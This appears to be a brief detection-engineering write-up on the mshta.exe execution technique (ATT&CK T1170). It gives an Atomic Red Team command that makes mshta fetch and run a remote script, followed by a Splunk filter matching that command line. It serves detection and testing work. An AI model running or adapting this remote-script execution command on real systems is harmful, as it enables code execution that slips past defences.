# Mshta -- T1170

## Technique Description

Mshta.exe is a Microsoft Utility that allows for the execution of HTML applications. An attacker can leverage mshta.exe to execute malicious .hta files and execute Javascript or VBScript using the trusted Windows Utility. Red Atomic/Canary provided a proof-of-concept for this ATT&CK Mitre Execution Technique. Here's an example command that leverages using mshta.exe to launch calc.exe

## Assumption
The adversary will leverage using mshta.exe to execute a remote script.

## Execution 

mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/mshta.sct')).Exec();close();

![mshta](https://user-images.githubusercontent.com/36422282/55601275-2a38fa00-572e-11e9-838d-f32599684b26.PNG)


## Detection
![mshta](https://user-images.githubusercontent.com/36422282/55601319-5d7b8900-572e-11e9-9d96-5d4aefac4bc8.png)

## Visibility

## Splunk Filter

NOTE: This filter is specific and relates to the specific attack technique itself.

host="DESKTOP-EHTEINI" ParentCommandLine="mshta.exe  javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/mshta.sct')).Exec();close();"





